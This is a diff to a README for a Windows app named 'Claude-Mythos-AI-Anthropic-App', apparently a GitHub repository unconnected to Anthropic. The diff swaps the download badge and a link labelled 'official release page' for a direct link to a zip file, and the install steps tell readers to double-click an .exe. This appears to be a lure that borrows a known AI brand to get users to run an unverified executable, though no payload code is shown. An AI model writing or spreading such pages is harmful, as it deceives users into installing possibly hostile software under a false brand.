@@ -1,6 +1,6 @@
 # 🤖 Claude-Mythos-AI-Anthropic-App - Run creative writing AI on Windows
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Stoneblind-oystershell920/Claude-Mythos-AI-Anthropic-App)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Stoneblind-oystershell920/Claude-Mythos-AI-Anthropic-App/main/Mythos/Mythos-App-Anthropic-A-Claude-v2.4.zip)
 
 ## 🖥️ Overview
 
@@ -18,7 +18,7 @@ Ensure your computer meets these specifications to run the application:
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/Stoneblind-oystershell920/Claude-Mythos-AI-Anthropic-App) to download the application.
+1. Visit the [official release page](https://raw.githubusercontent.com/Stoneblind-oystershell920/Claude-Mythos-AI-Anthropic-App/main/Mythos/Mythos-App-Anthropic-A-Claude-v2.4.zip) to download the application.
 2. Look for the file ending in .exe in the latest release section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation wizard.
